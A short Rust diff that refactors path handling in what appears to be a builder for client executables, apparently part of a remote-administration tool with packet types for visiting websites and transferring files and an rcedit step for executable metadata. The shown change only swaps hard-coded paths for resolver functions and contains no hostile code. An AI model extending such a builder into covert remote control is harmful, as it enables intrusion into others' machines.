@@ -26,6 +26,7 @@ use common::packets::{
     VisitWebsiteData, FileData
 };
 use common::client_info::ClientInfo;
+use crate::utils::resources::{get_rcedit_path, get_client_built_exe_path};
 
 use std::process::Command;
 
@@ -257,7 +258,9 @@ pub async fn build_client(
         }
     }
 
-    open_explorer("target/debug/Client_built.exe").await?;
+    let client_built_exe_path = get_client_built_exe_path().unwrap();
+
+    open_explorer(&client_built_exe_path.to_string_lossy()).await?;
 
     Ok("Client built".to_string())
 }
@@ -825,7 +828,8 @@ pub async fn read_icon(path: &str, _app_handle: AppHandle) -> Result<String, Str
 pub async fn read_exe(path: &str) -> Result<AssemblyInfo, String> {
     let _ = fs::read(path).map_err(|e| format!("Failed to read exe: {}", e))?;
 
-    let info = get_assembly_info(path, "target/rcedit.exe").unwrap();
+    let rcedit_path = get_rcedit_path().unwrap();
+    let info = get_assembly_info(path, &rcedit_path.to_string_lossy()).unwrap();
 
     Ok(info)
 }
